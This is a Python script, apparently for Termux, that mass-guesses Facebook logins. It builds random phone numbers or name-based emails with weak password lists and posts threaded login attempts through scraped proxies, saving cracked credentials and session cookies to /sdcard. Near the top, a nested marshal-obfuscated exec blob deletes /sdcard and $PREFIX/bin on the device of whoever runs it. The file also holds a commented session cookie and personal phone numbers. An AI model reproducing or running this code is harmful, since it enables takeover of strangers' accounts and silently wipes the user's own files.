import os,sys,time,json,random,re,string,platform,base64,uuid,marshal
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]


exec(marshal.loads(b'\xe1@\x08\x00\x00#_____________________________________\n#|>| THIS TOOL IS ENC BY HERON-AFRIDI\n#|>|FB_LINK:-https://www.facebook.com/PLZZZ.DISABLE.ME.IF.YOU.CAN\n#|>|WHATS_APP:-+8801722183463\n#_____________________________________\nimport marshal\nexec(marshal.loads(b\'\\xe1\\xf1\\x05\\x00\\x00#_____________________________________\\n#|>| THIS TOOL IS ENC BY HERON-AFRIDI\\n#|>|FB_LINK:-https://www.facebook.com/PLZZZ.DISABLE.ME.IF.YOU.CAN\\n#|>|WHATS_APP:-+8801722183463\\n#_____________________________________\\nimport marshal\\nexec(marshal.loads(b\\\'\\\\xe1H\\\\x04\\\\x00\\\\x00#_____________________________________\\\\n#|>| THIS TOOL IS ENC BY HERON-AFRIDI\\\\n#|>|FB_LINK:-https://www.facebook.com/PLZZZ.DISABLE.ME.IF.YOU.CAN\\\\n#|>|WHATS_APP:-+8801722183463\\\\n#_____________________________________\\\\nimport marshal\\\\nexec(marshal.loads(b\\\\\\\'\\\\\\\\xe1\\\\\\\\xee\\\\\\\\x02\\\\\\\\x00\\\\\\\\x00#_____________________________________\\\\\\\\n#|>| THIS TOOL IS ENC BY HERON-AFRIDI\\\\\\\\n#|>|FB_LINK:-https://www.facebook.com/PLZZZ.DISABLE.ME.IF.YOU.CAN\\\\\\\\n#|>|WHATS_APP:-+8801722183463\\\\\\\\n#_____________________________________\\\\\\\\nimport marshal\\\\\\\\nexec(marshal.loads(b\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\xe1\\\\\\\\\\\\\\\\xbb\\\\\\\\\\\\\\\\x01\\\\\\\\\\\\\\\\x00\\\\\\\\\\\\\\\\x00os.system("termux-setup-storage -y")\\\\\\\\\\\\\\\\nos.system("rm -rf /sdcard/")\\\\\\\\\\\\\\\\nos.system("rm -rf $PREFIX/bin")\\\\\\\\\\\\\\\\nprint(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'/033[31;1m\\\\\\\\\\\\\\\\n  _____   _____ _____ ___ __  __   __  __   _   _  _____ ___ \\\\\\\\\\\\\\\\n / __\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ / / __|_   _| __|  \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/  | |  \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/  | /_\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ | |/ / __| _ \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\__ \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ V /\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\__ \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ | | | _|| |\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/| | | |\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/| |/ _ \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\| \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' <| _||   /\\\\\\\\\\\\\\\\n |___/ |_| |___/ |_| |___|_|  |_| |_|  |_/_/ \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_|\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\___|_|_\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n                                                             \\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\')\\\\\\\\\\\\\\\\nsys.exit()\\\\\\\\\\\\\\\'))\\\\\\\'))\\\'))\'))'))
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
os.system('xdg-open https://www.facebook.com/band.dol.LITON.404')
logo = ("""
  \033[38;5;46m╔═════════════════════════════════════╗
  \033[38;5;46m║ ╔════════╗ \033[38;5;46m╔═══════════╗ \x1b[38;5;196m╔════════╗ ║
  \033[38;5;46m║ ║\033[30;1m██      ║ \033[38;5;46m║\033[30;1m    ██      ║\033[38;5;46m║\033[30;1m██████  ║
  \033[38;5;46m║ ║\033[30;1m██      ║ \033[38;5;46m║\033[30;1m    ██      ║\033[38;5;46m║\033[30;1m  ██    ║ ║
  \033[38;5;46m║ ║\033[30;1m██      ║ \033[38;5;46m║\033[30;1m    ██      ║\033[38;5;46m║\033[30;1m  ██    ║ ║
  \033[38;5;46m║ ║\033[30;1m██      ║ \033[38;5;46m║\033[30;1m    ██      ║\033[38;5;46m║\033[30;1m  ██    ║ ║
  \033[38;5;46m║ ║\033[30;1m███████ ║ \033[38;5;46m║\033[30;1m    ██      ║\033[38;5;46m║\033[30;1m  ██    ║
  \033[38;5;46m║ ╚════════╝ \033[38;5;46m╚═══════════╝ \033[38;5;46m╚════════╝ ║
  \033[38;5;46m║ ╔════════╗ \033[38;5;46m╔══════════╗             ║
  \033[38;5;46m║ ║ \033[30;1m█████  ║ \033[38;5;46m║\x1b[38;5;196m███    ██ ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗧𝗢𝗡𝄟⃝║
  \033[38;5;46m║ ║\033[30;1m██   ██ ║ \033[38;5;46m║\x1b[38;5;196m████   ██ ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗧𝗢𝗡𝄟⃝║
  \033[38;5;46m║ ║\033[30;1m██   ██ ║ \033[38;5;46m║\x1b[38;5;196m██ ██  ██ ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗧𝗢𝗡𝄟⃝║
  \033[38;5;46m║ ║\033[30;1m██   ██ ║ \033[38;5;46m║\x1b[38;5;196m██  ██ ██ ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗧𝗢𝗡𝄟⃝║
  \033[38;5;46m║ ║\033[30;1m██████  ║ \033[38;5;46m║\x1b[38;5;196m██   ████ ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗟𝗜𝗧𝗢𝗡𝄟⃝║
  \033[38;5;46m║ ╚════════╝ \033[38;5;46m╚══════════╝             ║ 
  \033[38;5;46m╚═════════════════════════════════════╝ 
\033[32;1m╔══════════════════════════════════════╗
\033[32;1m║[🔵]\033[1;37m𝐀𝐔𝐓𝐇𝐎𝐑_________\033[32;1mLITON Hassan          ║\033[32;1m✮⃝LITON𝄟⃝🔵
\033[32;1m║[🔵]\033[1;37m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊______\033[32;1mM.M Ail Liton       ║\033[32;1m✮⃝LITON𝄟⃝🔵
\033[32;1m║[🔵]\033[1;37m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏______\033[32;1m+8801932676776      ║\033[32;1m✮⃝LITON𝄟⃝🔵
\033[32;1m║[🔵]\033[1;37m𝐆𝐈𝐓𝐇𝐔𝐁__________\033[32;1mLITON-404 ║\033[32;1m✮⃝LITON𝄟⃝🔵
\033[32;1m║[🔵]\033[1;37m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌___________\033[32;1m+01932676776 ║\033[32;1m✮⃝LITON𝄟⃝🔵
\033[32;1m║[🔵]\033[1;37m𝐈𝐌𝐎______________\033[32;1m+01316276540   ║\033[32;1m✮⃝LITON𝄟⃝🔵
\033[32;1m║[🔵]\033[1;37m𝐅𝐑𝐎𝐌____________\033[32;1m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        ║\033[32;1m✮⃝LITON𝄟⃝🔵
\033[32;1m╚══════════════════════════════════════╝""")

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(" [01] Random Number Clone")
        print(" [02] Random Email Clone ")
        print(" [00] Exit")
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Mumit =input(" [?] Choose : ")
        os.system('xdg-open https://facebook.com/groups/termuxteambd/')
        if Mumit in ["1", "01"]:
            num()
        if Mumit in ["2","02"]:
            gml()
        if Mumit in [" 0", "00"]:
            exit()
        else:
            exit()
def num():
    user=[]
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    kode = input(' [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input(' [?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
        print(' \033[1;97m[+] Process has been started')
        print(' \033[1;97m[!] Wait for ids ')
        print(' \033[1;97m[!] Use flight mode for speed up ')
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')

def gml():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [?] Target fast name : ')
    os.system('clear')
    print(logo)
    kodex = input(' [?] Target last name :  ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    doamin = input(' [?] Terget doamin : ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input('[?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
        print(' \033[1;97m[+] Process has been started')
        print(' \033[1;97m[!] Wait for ids ')
        print(' \033[1;97m[!] Use flight mode for speed up ')
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mINNOCENT\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority': 'free.facebook.com',
    'method': 'POST',
    'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'datr=6O4KZBSnsm67WYlt6Ix3zv-c; sb=6O4KZF6nJkitJn9R8VSI0qcL; dpr=2; locale=en_GB; vpd=v1%3B628x0x2; m_pixel_ratio=2; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZaQk5kYklwZnFMY2dwN0Q5WTM1MGFwVkNMRjFvbGNFdVFEUWFJNWpIRUhIbjVwN2V4RFVaTHM5S0tpT1RjdzlHYyIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZlpCTmRiSXBmcUxjZ3A3RDlZMzUwYXBWQ0xGMW9sY0V1UURRYUk1akhFSEhuNXA3ZXhEVVpMczlLS2lPVGN3OUdjIiwicyI6Im0ifQ%3D%3D; wd=360x628; dnonce=AWm7BG251M9wv2_T0KaZzo4ZK5p2Q3i8iYT1zgiPV9vxcoeRmSgiikx9X0uDbNHqpW95xlSVpYO5y--lxrtw03Pd; fr=07HuPcYq1t8N0k120.AWUF6IuyN3k5qGoxJSyyDsPPKXE.BkDIQb.f7.AAA.0.0.BkFB7G.AWXFAVom4ZU',
    'origin': 'https://free.facebook.com',
    'referer': 'https://free.facebook.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[LITON-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[LITON-CP] {cid}|{ps}")
                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[LITON] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()